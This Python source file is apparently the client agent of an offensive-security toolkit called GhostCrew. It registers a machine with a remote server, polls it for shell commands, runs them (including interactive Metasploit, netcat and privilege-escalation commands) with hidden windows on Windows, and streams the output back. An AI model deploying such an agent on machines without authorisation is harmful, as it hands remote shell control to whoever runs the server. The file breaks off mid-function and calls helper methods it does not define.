#!/usr/bin/env python3
"""
Cross-Platform GhostCrew Client with Interactive Command Support
Compatible with Windows and Linux systems
"""

import os
import sys
import time
import json
import signal
import threading
import subprocess
import requests
import logging
import tempfile
import platform
from datetime import datetime, timedelta
from pathlib import Path

# Platform detection
IS_WINDOWS = platform.system().lower() == 'windows'
IS_LINUX = platform.system().lower() == 'linux'

# Platform-specific imports
if IS_WINDOWS:
    import msvcrt
    import ctypes
    from ctypes import wintypes
    try:
        import winpty
        HAS_WINPTY = True
    except ImportError:
        HAS_WINPTY = False
else:
    import pty
    import termios
    import fcntl
    import struct
    import select

# Enable debug logging
DEBUG_MODE = True

if DEBUG_MODE:
    logging.basicConfig(level=logging.DEBUG)

def debug_print(message):
    if DEBUG_MODE:
        print(f"[DEBUG] {message}")

def log_interactive_status(self, message, command_id=None):
    """Enhanced logging for interactive command debugging"""
    timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    cmd_info = f" [CMD:{command_id}]" if command_id else ""
    mode_info = " [INTERACTIVE]" if self.interactive_mode else " [NORMAL]"
    print(f"[{timestamp}]{mode_info}{cmd_info} {message}")

class CrossPlatformCommandClient:
    def __init__(self, host_id, api_url, instance_token=None):
        self.host_id = host_id
        self.api_url = api_url
        self.instance_token = instance_token
        self.session_id = None
        self.current_process = None
        self.running = True
        self.output_buffer = []
        self.last_output_time = time.time()
        self.command_start_time = None
        self.interactive_mode = False
        self.current_command_id = None

        # Enhanced configuration for better streaming
        self.output_buffer_size = 1024  # Larger buffer for better performance
        self.stream_update_interval = 1.5  # Seconds between stream updates
        self.input_check_interval = 0.5  # More frequent input checking
        self.max_interactive_duration = 1800  # 30 minutes max for interactive commands
        self.heartbeat_interval = 10  # Seconds between heartbeats for interactive sessions
        self.sent_content_hashes = {}  # Track content hashes per command
        self.command_output_positions = {}  # Track sent length per command
        self.latest_output = ""
        
        # Platform-specific setup
        self.setup_platform_specifics()
        
        # Interactive command patterns
        self.interactive_commands = {
            'telnet', 'ssh', 'ftp', 'sftp', 'mysql', 'psql', 'redis-cli',
            'python', 'python3', 'node', 'irb', 'bc', 'gdb', 'vim', 'nano',
            'less', 'more', 'top', 'htop', 'watch', 'tail', 'ping', 'msfconsole'
        }
        
        # Commands that typically run continuously
        self.continuous_commands = {
            'ping', 'tail', 'watch', 'top', 'htop', 'tcpdump', 'netstat'
        }
        
        # Platform-specific interactive commands
        if IS_WINDOWS:
            self.interactive_commands.update({
                'cmd', 'powershell', 'pwsh', 'netsh', 'diskpart', 'sqlcmd'
            })
            self.continuous_commands.update({
                'ping', 'netstat'
            })
        
        # Signal handlers (Windows handles differently)
        if not IS_WINDOWS:
            signal.signal(signal.SIGINT, self.signal_handler)
            signal.signal(signal.SIGTERM, self.signal_handler)
    
    def setup_platform_specifics(self):
        """Setup platform-specific configurations"""
        if IS_WINDOWS:
            # Windows-specific setup
            self.working_directory = os.getcwd()
            self.shell_command = ['cmd', '/c'] if not self.is_powershell_available() else ['powershell', '-Command']
            self.current_pty_master = None
            self.current_pty_slave = None
            
            # Enable ANSI colors on Windows 10+
            try:
                kernel32 = ctypes.windll.kernel32
                kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            except:
                pass
        else:
            # Linux-specific setup
            self.working_directory = os.getcwd()
            self.shell_command = ['/bin/bash', '-c']
            self.current_pty_master = None
            self.current_pty_slave = None
    
    def is_powershell_available(self):
        """Check if PowerShell is available on Windows"""
        try:
            subprocess.run(['powershell', '-Command', 'echo test'], 
                          capture_output=True, timeout=5)
            return True
        except:
            return False
    
    def signal_handler(self, signum, frame):
        """Handle shutdown signals (Unix only)"""
        print(f"Received signal {signum}, shutting down...")
        self.running = False
        self.cleanup_process()
        sys.exit(0)
    
    def start_heartbeat_thread(self):
        """Start enhanced heartbeat thread for interactive sessions"""
        def heartbeat_worker():
            last_ping = time.time()
            ping_interval = 10  # More frequent pings for interactive sessions
            
            while self.interactive_mode and self.running:
                current_time = time.time()
                if current_time - last_ping >= ping_interval:
                    try:
                        # Enhanced ping with session info
                        data = {
                            'action': 'ping_host',
                            'host_id': self.host_id,
                            'is_interactive': True,
                            'session_id': self.session_id,
                            'command_id': self.current_command_id
                        }
                        
                        if self.instance_token:
                            data['instance_token'] = self.instance_token
                        
                        response = requests.post(self.api_url, data=data, timeout=5)
                        result = response.json()
                        
                        if result.get('status') == 'success':
                            debug_print(f"Interactive heartbeat successful at {time.strftime('%H:%M:%S')}")
                        else:
                            print(f"Interactive heartbeat failed: {result.get('message', 'Unknown error')}")
                            
                    except Exception as e:
                        print(f"Heartbeat error: {e}")
                        
                    last_ping = current_time
                
                time.sleep(2)  # Check every 2 seconds
            
            debug_print("Interactive heartbeat thread stopped")
        
        heartbeat_thread = threading.Thread(target=heartbeat_worker, daemon=True)
        heartbeat_thread.start()
        debug_print("Interactive heartbeat thread started")
        return heartbeat_thread

    def register_host(self):
        """Register this host with the server"""
        try:
            hostname = platform.node() or 'unknown'
            
            # Get OS information
            if IS_WINDOWS:
                os_info = f"Windows {platform.release()}"
                try:
                    # Get IP address on Windows
                    result = subprocess.run(['ipconfig'], capture_output=True, text=True)
                    # Simple IP extraction (could be improved)
                    ip_address = "127.0.0.1"  # Fallback
                except:
                    ip_address = "127.0.0.1"
            else:
                try:
                    with open('/etc/os-release', 'r') as f:
                        os_info = f.read().split('\n')[0].replace('PRETTY_NAME=', '').strip('"')
                except:
                    os_info = f"Linux {platform.release()}"
                
                # Get IP address on Linux
                try:
                    result = subprocess.run(['hostname', '-I'], capture_output=True, text=True)
                    ip_address = result.stdout.strip().split()[0]
                except:
                    ip_address = "127.0.0.1"
            
            data = {
                'action': 'register_host',
                'host_id': self.host_id,
                'hostname': hostname,
                'ip_address': ip_address,
                'os_info': os_info
            }
            
            if self.instance_token:
                data['instance_token'] = self.instance_token
            
            response = requests.post(self.api_url, data=data, timeout=10)
            result = response.json()
            
            if result.get('status') == 'success':
                print(f"Host registered successfully: {hostname}")
                return True
            else:
                print(f"Failed to register host: {result.get('message', 'Unknown error')}")
                return False
                
        except Exception as e:
            print(f"Error registering host: {e}")
            return False
    
    def ping_host(self):
        """Send ping to keep host alive"""
        try:
            data = {
                'action': 'ping_host',
                'host_id': self.host_id,
                'is_interactive': self.interactive_mode
            }
            
            if self.instance_token:
                data['instance_token'] = self.instance_token
            
            response = requests.post(self.api_url, data=data, timeout=5)
            return response.json().get('status') == 'success'
        except Exception as e:
            print(f"Ping error: {e}")
            return False
    
    def get_command(self):
        """Get next command from server"""
        try:
            data = {
                'action': 'get_command',
                'host_id': self.host_id
            }
            
            if self.instance_token:
                data['instance_token'] = self.instance_token
            
            response = requests.post(self.api_url, data=data, timeout=10)
            result = response.json()
            
            if result.get('status') == 'success':
                command_id = result.get('command_id', 0)
                command = result.get('command', '').strip()
                session_id = result.get('session_id', '')
                
                if command_id > 0 and command:
                    return {
                        'command_id': command_id,
                        'command': command,
                        'session_id': session_id
                    }
            
            return None
            
        except Exception as e:
            print(f"Error getting command: {e}")
            return None
    
    def submit_result(self, command_id, output, execution_time, working_directory=None, exit_code=0):
        """Submit command result to server"""
        try:
            data = {
                'action': 'submit_result',
                'command_id': command_id,
                'output': output,
                'execution_time': execution_time,
                'working_directory': working_directory or self.working_directory,
                'exit_code': exit_code
            }
            
            response = requests.post(self.api_url, data=data, timeout=30)
            return response.json().get('status') == 'success'
            
        except Exception as e:
            print(f"Error submitting result: {e}")
            return False
    
    def should_send_content(self, command_id, content):
        """Check if content should be sent (avoid duplicates)"""
        import hashlib
        
        if not content or not content.strip():
            return False
        
        # Create hash of content
        content_hash = hashlib.md5(content.encode('utf-8')).hexdigest()
        
        # Check if we've already sent this exact content for this command
        if command_id in self.sent_content_hashes:
            if content_hash in self.sent_content_hashes[command_id]:
                print(f"Skipping duplicate content for command {command_id}")
                return False
            self.sent_content_hashes[command_id].add(content_hash)
        else:
            self.sent_content_hashes[command_id] = {content_hash}
        
        return True

    def reset_command_tracking(self, command_id):
        """Reset tracking for a command when it starts"""
        if hasattr(self, 'sent_content_hashes'):
            self.sent_content_hashes.pop(command_id, None)
        if hasattr(self, 'command_output_positions'):
            self.command_output_positions.pop(command_id, None)
        if hasattr(self, 'latest_output'):
            self.latest_output = ""

    # Enhanced stream_output_update method
    def stream_output_update(self, command_id, output, session_id, is_partial=True, chunk_sequence=1):
        """Send streaming output update to server with duplicate prevention"""
        try:
            # Ensure output is properly encoded
            if isinstance(output, bytes):
                for encoding in ['utf-8', 'latin1', 'cp1252']:
                    try:
                        output = output.decode(encoding)
                        break
                    except UnicodeDecodeError:
                        continue
                else:
                    output = output.decode('utf-8', errors='replace')
            
            # Clean up output for better display
            import re
            ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]|\x1B[@-_]')
            cleaned_output = ansi_escape.sub('', output)
            cleaned_output = re.sub(r'[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]', '', cleaned_output)
            
            # Check if we should send this content
            if not self.should_send_content(command_id, cleaned_output):
                return True  # Return success but don't send
            
            data = {
                'action': 'stream_output',
                'command_id': command_id,
                'session_id': session_id,
                'output': cleaned_output,
                'is_partial': is_partial,
                'chunk_sequence': chunk_sequence
            }
            
            debug_print(f"Streaming NEW output for command {command_id}: {len(cleaned_output)} chars, partial: {is_partial}")
            response = requests.post(self.api_url, data=data, timeout=10)
            
            if response.status_code != 200:
                print(f"HTTP error {response.status_code}: {response.text[:100]}")
                return False
                
            try:
                result = response.json()
                if result.get('status') != 'success':
                    print(f"Failed to stream output: {result.get('message', 'Unknown error')}")
                    return False
                return True
            except ValueError as e:
                print(f"JSON decode error in stream_output_update: {e}")
                print(f"Response content: {response.text[:200]}")
                return False
                
        except Exception as e:
            print(f"Error streaming output: {e}")
            debug_print(f"API URL: {self.api_url}")
            return False


    def check_for_input(self, session_id):
        """Check server for user input to send to interactive command with enhanced handling"""
        try:
            data = {
                'action': 'get_user_input',
                'session_id': session_id,
                'host_id': self.host_id
            }
            
            response = requests.post(self.api_url, data=data, timeout=2)
            
            if response.status_code != 200:
                debug_print(f"HTTP error {response.status_code} in check_for_input")
                return None
                
            try:
                result = response.json()
                if result.get('status') == 'success' and result.get('input'):
                    user_input = result.get('input')
                    input_type = result.get('input_type', 'response')
                    
                    debug_print(f"Received user input: {repr(user_input)}, type: {input_type}")
                    
                    # Handle special input types
                    if input_type == 'ctrl_signal':
                        # Handle control signals (like Ctrl+C)
                        if user_input == '\x03':  # Ctrl+C
                            debug_print("Received Ctrl+C signal")
                            return 'CTRL_C_SIGNAL'
                        elif user_input == '\x04':  # Ctrl+D
                            debug_print("Received Ctrl+D signal")
                            return 'CTRL_D_SIGNAL'
                    
                    return user_input
                    
            except ValueError as e:
                debug_print(f"JSON decode error in check_for_input: {e}")
                return None
            
        except Exception as e:
            debug_print(f"Error checking for input: {e}")
        
        return None
    
    def send_input_to_process(self, user_input, process_handle=None, pty_handle=None):
        """Send input to process with proper handling for different platforms and input types"""
        try:
            # Handle special signals
            if user_input == 'CTRL_C_SIGNAL':
                print("Processing Ctrl+C signal...")
                if IS_WINDOWS:
                    if process_handle and hasattr(process_handle, 'terminate'):
                        process_handle.terminate()
                    elif self.current_process:
                        self.current_process.terminate()
                else:
                    if self.current_process:
                        import signal
                        try:
                            os.killpg(os.getpgid(self.current_process.pid), signal.SIGINT)
                        except:
                            self.current_process.terminate()
                return True
            
            elif user_input == 'CTRL_D_SIGNAL':
                print("Processing Ctrl+D signal...")
                if IS_WINDOWS:
                    if pty_handle:
                        pty_handle.write('\x04')
                else:
                    if pty_handle:
                        os.write(pty_handle, b'\x04')
                return True
            
            # Regular input handling
            if IS_WINDOWS:
                if pty_handle and hasattr(pty_handle, 'write'):
                    if not user_input.endswith('\r\n'):
                        user_input += '\r\n'
                    pty_handle.write(user_input)
                    print(f"Sent input to Windows PTY: {repr(user_input[:50])}")
                    return True
            else:
                if pty_handle is not None:
                    input_bytes = user_input.encode('utf-8')
                    if not user_input.endswith('\n'):
                        input_bytes += b'\n'
                    os.write(pty_handle, input_bytes)
                    print(f"Sent input to Linux PTY: {repr(user_input[:50])}")
                    return True
            
            return False
            
        except Exception as e:
            print(f"Error sending input to process: {e}")
            return False

    def is_interactive_command(self, command):
        """Determine if command is likely to be interactive with enhanced patterns"""
        command_parts = command.strip().split()
        if not command_parts:
            return False
        
        base_command = command_parts[0].split('/')[-1].split('\\')[-1].lower()
        
        debug_print(f"Checking if command is interactive: {command}")
        debug_print(f"Base command: {base_command}")
        
        # Enhanced interactive command list
        interactive_commands = {
            'telnet', 'ssh', 'ftp', 'sftp', 'mysql', 'psql', 'redis-cli',
            'python', 'python3', 'python2', 'node', 'irb', 'bc', 'gdb', 
            'vim', 'nano', 'less', 'more', 'top', 'htop', 'watch', 'tail', 
            'ping', 'msfconsole', 'nc', 'netcat', 'socat', 'sqlcmd',
            'sudo', 'su'  # ADD THESE
        }
        
        # Platform-specific additions
        if IS_WINDOWS:
            interactive_commands.update({
                'cmd', 'powershell', 'pwsh', 'netsh', 'diskpart', 
                'wmic', 'reg', 'sc', 'tasklist', 'systeminfo',
                'runas'  # ADD THIS for Windows
            })
        else:
            interactive_commands.update({
                'bash', 'zsh', 'sh', 'fish', 'tmux', 'screen', 'vi'
            })
        
        # Check against known interactive commands
        if base_command in interactive_commands:
            debug_print(f"Command {base_command} found in interactive_commands list")
            return True
        
        # Enhanced pattern matching
        import re
        interactive_patterns = [
            # Network tools
            r'^telnet\s+', r'^ssh\s+', r'^nc\s+', r'^netcat\s+', r'^socat\s+',
            
            # Database clients
            r'^mysql\s+.*-[pP]', r'^psql\s+.*-[hH]', r'^redis-cli\s+',
            r'^mongo\s+', r'^sqlite3?\s+',
            
            # Programming languages with interactive flags
            r'^python[23]?(\s+.*)?-i', r'^python[23]?\s*$', 
            r'^node\s*$', r'^irb\s*$', r'^php\s+.*-a',
            
            # System monitoring
            r'^top\s*$', r'^htop\s*$', r'^watch\s+', 
            r'^tail\s+.*-[fF]', r'^ping\s+',
            
            # Text editors
            r'^(vi|vim|nano|emacs)\s+', r'^less\s+', r'^more\s+',
            
            # Interactive shells and tools
            r'^msfconsole\s*', r'^gdb\s+', r'^lldb\s+',
            
            # Continuous processes
            r'^tcpdump\s+', r'^wireshark\s+', r'^iftop\s*', r'^iotop\s*',
            
            # ADD THESE PRIVILEGE ESCALATION PATTERNS:
            r'^sudo\s+.*passwd\s*',     # sudo passwd (any user)
            r'^sudo\s+.*su\s*',         # sudo su
            r'^su\s+.*',                # su commands
            r'^sudo\s+.*adduser\s*',    # sudo adduser
            r'^sudo\s+.*useradd\s*',    # sudo useradd
            r'^sudo\s+.*usermod\s*',    # sudo usermod
            r'^sudo\s+.*visudo\s*',     # sudo visudo
            r'^sudo\s+.*john\s*',     # sudo john
            r'^sudo\s+.*dpkg-reconfigure\s*',  # sudo dpkg-reconfigure
        ]
        
        # Windows-specific patterns
        if IS_WINDOWS:
            interactive_patterns.extend([
                r'^cmd\s*/[kK]', r'^cmd\s*$',  # Interactive cmd
                r'^powershell\s*$', r'^pwsh\s*$',  # Interactive PowerShell
                r'^netsh\s*$', r'^diskpart\s*$',  # Interactive Windows tools
                r'^wmic\s*$', r'^reg\s+query\s*$',  # Interactive system tools
                r'^runas\s+.*',  # ADD THIS
            ])
        
        # Check patterns
        for pattern in interactive_patterns:
            if re.match(pattern, command, re.IGNORECASE):
                debug_print(f"Command matches interactive pattern: {pattern}")
                return True
        
        # Special case: commands that end with interactive flags
        if re.search(r'\s+-[iI]\s*$', command):
            debug_print(f"Command has interactive flag (-i)")
            return True
        
        debug_print(f"Command NOT detected as interactive: {command}")
        return False

    def is_continuous_command(self, command):
        """Check if command runs continuously"""
        command_parts = command.strip().split()
        if not command_parts:
            return False
        
        base_command = command_parts[0].split('/')[-1].split('\\')[-1].lower()
        return base_command in self.continuous_commands
    
    def execute_simple_command(self, command):
        """Execute a simple non-interactive command"""
        try:
            original_cwd = os.getcwd()
            os.chdir(self.working_directory)
            
            start_time = time.time()
            
            if IS_WINDOWS:
                # Windows command execution
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    cwd=self.working_directory,
                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
                )
            else:
                # Linux command execution
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    cwd=self.working_directory
                )
            
            self.current_process = process
            
            # Wait for completion with timeout
            try:
                output, _ = process.communicate(timeout=300)  # 5 minute timeout
                exit_code = process.returncode
            except subprocess.TimeoutExpired:
                process.kill()
                output = "Command timed out after 5 minutes"
                exit_code = 124
            
            execution_time = time.time() - start_time
            
            # Update working directory if cd command
            if command.strip().lower().startswith('cd '):
                try:
                    self.working_directory = os.getcwd()
                except:
                    pass
            
            os.chdir(original_cwd)
            return output, execution_time, exit_code
            
        except Exception as e:
            execution_time = time.time() - start_time if 'start_time' in locals() else 0
            return f"Error executing command: {str(e)}", execution_time, 1
        finally:
            self.current_process = None
    
    def setup_pty_windows(self):
        """Set up pseudo-terminal for Windows (using winpty if available)"""
        if HAS_WINPTY:
            try:
                pty_process = winpty.PtyProcess.spawn(['cmd.exe'])
                return pty_process, None
            except Exception as e:
                print(f"Failed to create winpty process: {e}")
                return None, None
        else:
            # Fallback to regular subprocess for Windows
            return None, None
    
    def setup_pty_linux(self):
        """Set up pseudo-terminal for Linux"""
        master, slave = pty.openpty()
        
        # Set terminal size
        try:
            winsize = struct.pack('HHHH', 24, 80, 0, 0)
            fcntl.ioctl(slave, termios.TIOCSWINSZ, winsize)
        except:
            pass
        
        return master, slave
    
    def read_pty_output_windows(self, pty_process, command_id, session_id):
        """Read output from Windows PTY and stream ONLY NEW content to server"""
        if not pty_process:
            return ""
        
        complete_output = ""  # Track complete output locally
        last_sent_length = 0  # Track how much we've already sent
        last_send_time = time.time()
        send_interval = 1.5
        chunk_sequence = 1
        
        print(f"Starting Windows output monitoring for command {command_id}")
        
        while self.interactive_mode and self.running:
            try:
                if pty_process.isalive():
                    data = pty_process.read(timeout=500)
                    if data:
                        # Clean up data
                        import re
                        ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]|\x1B[@-_]')
                        cleaned_data = ansi_escape.sub('', data)
                        cleaned_data = re.sub(r'[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]', '', cleaned_data)
                        
                        if cleaned_data.strip():
                            complete_output += cleaned_data
                            print(f"Added {len(cleaned_data)} chars, total: {len(complete_output)}")
                            self.last_output_time = time.time()
                else:
                    print("PTY process is no longer alive")
                    break
                
                # Send periodic updates with ONLY NEW content
                current_time = time.time()
                if current_time - last_send_time >= send_interval:
                    current_length = len(complete_output)
                    
                    # Only send if there's new content
                    if current_length > last_sent_length:
                        # Send only the new portion
                        new_content = complete_output[last_sent_length:]
                        print(f"Sending NEW content: {len(new_content)} chars (total: {current_length})")
                        
                        success = self.stream_output_update(
                            command_id, 
                            new_content,  # Send ONLY new content
                            session_id, 
                            True, 
                            chunk_sequence
                        )
                        
                        if success:
                            last_sent_length = current_length  # Update sent tracker
                            chunk_sequence += 1
                        
                    last_send_time = current_time
                
            except Exception as e:
                print(f"Error in Windows output reading: {e}")
                break
        
        # Send final new content if any
        final_length = len(complete_output)
        if final_length > last_sent_length:
            final_new_content = complete_output[last_sent_length:]
            print(f"Sending final NEW content: {len(final_new_content)} chars")
            self.stream_output_update(command_id, final_new_content, session_id, False, chunk_sequence)
        
        return complete_output

    def read_pty_output_linux(self, master_fd, command_id, session_id):
        """Read output from Linux PTY and stream ONLY NEW content to server"""
        complete_output = ""  # Track complete output locally
        last_sent_length = 0  # Track how much we've already sent
        last_send_time = time.time()
        send_interval = 1.5
        chunk_sequence = 1
        
        print(f"Starting Linux output monitoring for command {command_id}")
        
        while self.interactive_mode and self.running:
            try:
                ready, _, _ = select.select([master_fd], [], [], 0.5)
                
                if ready:
                    try:
                        raw_data = os.read(master_fd, 1024)
                        data = None
                        
                        # Try different encodings
                        for encoding in ['utf-8', 'latin1', 'cp1252', 'ascii']:
                            try:
                                data = raw_data.decode(encoding)
                                break
                            except UnicodeDecodeError:
                                continue
                        
                        if data is None:
                            data = raw_data.decode('utf-8', errors='replace')
                        
                        # Clean up data
                        if data:
                            import re
                            ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]|\x1B[@-_]')
                            cleaned_data = ansi_escape.sub('', data)
                            cleaned_data = re.sub(r'[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]', '', cleaned_data)
                            
                            if cleaned_data.strip():
                                complete_output += cleaned_data
                                print(f"Added {len(cleaned_data)} chars, total: {len(complete_output)}")
                                self.last_output_time = time.time()
                                
                    except OSError as e:
                        print(f"PTY read error: {e}")
                        break
                
                # Send periodic updates with ONLY NEW content
                current_time = time.time()
                if current_time - last_send_time >= send_interval:
                    current_length = len(complete_output)
                    
                    # Only send if there's new content
                    if current_length > last_sent_length:
                        # Send only the new portion
                        new_content = complete_output[last_sent_length:]
                        print(f"Sending NEW content: {len(new_content)} chars (total: {current_length})")
                        
                        success = self.stream_output_update(
                            command_id, 
                            new_content,  # Send ONLY new content
                            session_id, 
                            True, 
                            chunk_sequence
                        )
                        
                        if success:
                            last_sent_length = current_length  # Update sent tracker
                            chunk_sequence += 1
                        
                    last_send_time = current_time
                
                # Check for process completion
                if self.current_process and self.current_process.poll() is not None:
                    print(f"Process completed with exit code: {self.current_process.returncode}")
                    break
                
            except Exception as e:
                print(f"Error in Linux output reading: {e}")
                break
        
        # Send final new content if any
        final_length = len(complete_output)
        if final_length > last_sent_length:
            final_new_content = complete_output[last_sent_length:]
            print(f"Sending final NEW content: {len(final_new_content)} chars")
            self.stream_output_update(command_id, final_new_content, session_id, False, chunk_sequence)
        
        return complete_output
    
    def detect_session_ready(self, output, command):
        """Detect if an interactive session is ready for input - more conservative"""
        if not output or len(output) < 100:  # Need substantial output
            return False
        
        # Look at only the last 200 characters to avoid false positives from startup
        recent_output = output[-200:].strip()
        
        # Common prompt patterns for different tools
        ready_patterns = [
            r'msf6?\s*>\s*$',          # Metasploit
            r'mysql>\s*$',             # MySQL
            r'psql>\s*$',              # PostgreSQL  
            r'>>>\s*$',                # Python
            r'>\s*$',                  # Generic prompt
            r'\$\s*$',                 # Shell prompt
            r'#\s*$',                  # Root shell
            r'ftp>\s*$',               # FTP
            r'telnet>\s*$',            # Telnet
            r'ssh>\s*$',               # SSH (rare but possible)
        ]
        
        # Check if recent output ends with any ready pattern
        import re
        for pattern in ready_patterns:
            if re.search(pattern, recent_output, re.MULTILINE):
                # Additional check: make sure this isn't just part of startup text
                lines = recent_output.split('\n')
                if len(lines) > 0 and re.search(pattern, lines[-1]):
                    return True
        
        return False

    def should_stop_streaming(self, output, time_since_last_output):
        """Determine if we should stop streaming based on output patterns"""
        # Stop if no new output for more than 30 seconds after seeing a prompt
        if time_since_last_output > 30 and self.detect_session_ready(output, None):
            return True
        
        # Stop if no output for 60 seconds (general timeout)
        if time_since_last_output > 60:
            return True
        
        return False

    def execute_interactive_command(self, command, command_id, session_id):
        """Execute an interactive command that stays alive until explicitly terminated"""
        start_time = time.time()
        execution_time = 0
        exit_code = 1
        
        try:
            print(f">>> Starting persistent interactive execution for: {command}")
            self.interactive_mode = True
            self.current_command_id = command_id
            
            # Reset tracking for this command
            self.reset_command_tracking(command_id)
            
            original_cwd = os.getcwd()
            os.chdir(self.working_directory)
            
            # Send initial status
            initial_message = f"Starting interactive command: {command}\n"
            self.stream_output_update(command_id, initial_message, session_id, True, 1)
            
            if IS_WINDOWS:
                # Windows interactive execution - persistent mode
                if HAS_WINPTY:
                    pty_process, _ = self.setup_pty_windows()
                    if pty_process:
                        print("Using winpty for persistent Windows PTY")
                        
                        # Send the command to start
                        pty_process.write(command + '\r\n')
                        
                        # Start output reading in persistent mode
                        output_thread = threading.Thread(
                            target=self.read_pty_output_windows_persistent,
                            args=(pty_process, command_id, session_id),
                            daemon=True
                        )
                        output_thread.start()
                        
                        # Start heartbeat for interactive session
                        heartbeat_thread = self.start_heartbeat_thread()
                        
                        # PERSISTENT main loop for Windows - NO TIMEOUTS
                        last_input_check = time.time()
                        input_check_interval = 0.5
                        session_ready_detected = False
                        session_ready_time = None
                        minimum_run_time = 15  # Still wait minimum time before detecting ready state
                        
                        while self.interactive_mode and self.running:
                            if not pty_process.isalive():
                                print("Windows PTY process terminated naturally")
                                break
                            
                            current_time = time.time()
                            elapsed_time = current_time - start_time
                            
                            # Check for user input
                            if current_time - last_input_check >= input_check_interval:
                                user_input = self.check_for_input(session_id)
                                if user_input:
                                    success = self.send_input_to_process(user_input, pty_process, pty_process)
                                    if not success and user_input == 'CTRL_C_SIGNAL':
                                        print("Terminating due to Ctrl+C")
                                        break
                                    # Reset ready detection when user interacts
                                    if user_input not in ['CTRL_C_SIGNAL', 'heartbeat']:
                                        session_ready_detected = False
                                        session_ready_time = None
                                        print("User interaction detected, resetting ready state")
                                last_input_check = current_time
                            
                            # Only detect ready state after minimum time, but DON'T terminate
                            if elapsed_time > minimum_run_time and not session_ready_detected:
                                if (hasattr(self, 'latest_output') and 
                                    len(self.latest_output) > 500 and 
                                    self.detect_session_ready(self.latest_output, command)):
                                    
                                    session_ready_detected = True
                                    session_ready_time = current_time
                                    print(f"Session appears ready for command {command_id} (after {elapsed_time:.1f}s) - but keeping alive")
                                    
                                    # Send ready notification but DON'T terminate
                                    ready_message = "\n[Interactive session ready - send commands or type 'exit' to close]\n"
                                    self.stream_output_update(command_id, ready_message, session_id, True, 9999)
                            
                            # ONLY exit conditions: process dies or explicit termination
                            # NO timeout-based termination
                            
                            time.sleep(0.2)
                        
                        # Session ended - determine why
                        if not pty_process.isalive():
                            print("Interactive session ended - process terminated")
                            exit_code = pty_process.exitstatus if pty_process.exitstatus is not None else 0
                        else:
                            print("Interactive session ended - user requested termination")
                            exit_code = 0
                        
                        self.interactive_mode = False
                        
                        # Wait for output thread to complete
                        output_thread.join(timeout=10)
                            
                    else:
                        print("Failed to create Windows PTY, falling back to simple execution")
                        return self.execute_simple_command(command)
                else:
                    print("winpty not available, falling back to simple execution")
                    return self.execute_simple_command(command)
            
            else:
                # Linux interactive execution - persistent mode
                master, slave = self.setup_pty_linux()
                self.current_pty_master = master
                self.current_pty_slave = slave
                
                # Start the process
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdin=slave,
                    stdout=slave,
                    stderr=slave,
                    preexec_fn=os.setsid,
                    cwd=self.working_directory
                )
                
                self.current_process = process
                os.close(slave)
                
                # Give process time to start
                time.sleep(1.0)
                
                # Start output reading in persistent mode
                output_thread = threading.Thread(
                    target=self.read_pty_output_linux_persistent,
                    args=(master, command_id, session_id),
                    daemon=True
                )
                output_thread.start()
                
                # Start heartbeat for interactive session
                heartbeat_thread = self.start_heartbeat_thread()
                
                # PERSISTENT main loop for Linux - NO TIMEOUTS
                last_input_check = time.time()
                input_check_interval = 0.5
                session_ready_detected = False
                session_ready_time = None
                minimum_run_time = 15
                
                while self.interactive_mode and self.running:
                    if process.poll() is not None:
                        print(f"Linux process terminated naturally with exit code: {process.returncode}")
                        exit_code = process.returncode
                        break
                    
                    current_time = time.time()
                    elapsed_time = current_time - start_time
                    
                    # Check for user input
                    if current_time - last_input_check >= input_check_interval:
                        user_input = self.check_for_input(session_id)
                        if user_input:
                            success = self.send_input_to_process(user_input, process, master)
                            if not success and user_input == 'CTRL_C_SIGNAL':
                                print("Terminating due to Ctrl+C")
                                break
                            # Reset ready detection when user interacts
                            if user_input not in ['CTRL_C_SIGNAL', 'heartbeat']:
                                session_ready_detected = False
                                session_ready_time = None
                                print("User interaction detected, resetting ready state")
                        last_input_check = current_time
                    
                    # Only detect ready state after minimum time, but DON'T terminate
                    if elapsed_time > minimum_run_time and not session_ready_detected:
                        if (hasattr(self, 'latest_output') and 
                            len(self.latest_output) > 500 and 
                            self.detect_session_ready(self.latest_output, command)):
                            
                            session_ready_detected = True
                            session_ready_time = current_time
                            print(f"Session appears ready for command {command_id} (after {elapsed_time:.1f}s) - but keeping alive")
                            
                            # Send ready notification but DON'T terminate
                            ready_message = "\n[Interactive session ready - send commands or type 'exit' to close]\n"
                            self.stream_output_update(command_id, ready_message, session_id, True, 9999)
                    
                    # ONLY exit conditions: process dies or explicit termination
                    # NO timeout-based termination
                    
                    time.sleep(0.2)
                
                self.interactive_mode = False
                
                # Wait for output thread to complete
                output_thread.join(timeout=10)
                
                # Cleanup process
                try:
                    if process.poll() is None:
                        print("Terminating process...")
                        process.terminate()
                        time.sleep(2)
                        if process.poll() is None:
                            print("Killing process...")
                            process.kill()
                    process.wait()
                    exit_code = process.returncode if process.returncode is not None else 0
                except Exception as e:
                    print(f"Error during process cleanup: {e}")
                    exit_code = 1
                
                # Close PTY master
                try:
                    os.close(master)
                except:
                    pass
            
            os.chdir(original_cwd)
            execution_time = time.time() - start_time
            
            print(f"Interactive command completed - Exit code: {exit_code}, Duration: {execution_time:.2f}s")
            
            # Return empty output since streaming handled the real-time output
            return "", execution_time, exit_code
            
        except Exception as e:
            print(f"ERROR in execute_interactive_command: {e}")
            import traceback
            traceback.print_exc()
            
            self.interactive_mode = False
            execution_time = time.time() - start_time
            
            # Send error as final output
            error_output = f"Error executing interactive command: {str(e)}"
            self.stream_output_update(command_id, error_output, session_id, False, 999)
            
            return error_output, execution_time, 1
        finally:
            # Cleanup tracking
            self.reset_command_tracking(command_id)
            self.cleanup_process()


    def read_pty_output_windows_enhanced(self, pty_process, command_id, session_id):
        """Enhanced Windows PTY output reading with delayed completion detection"""
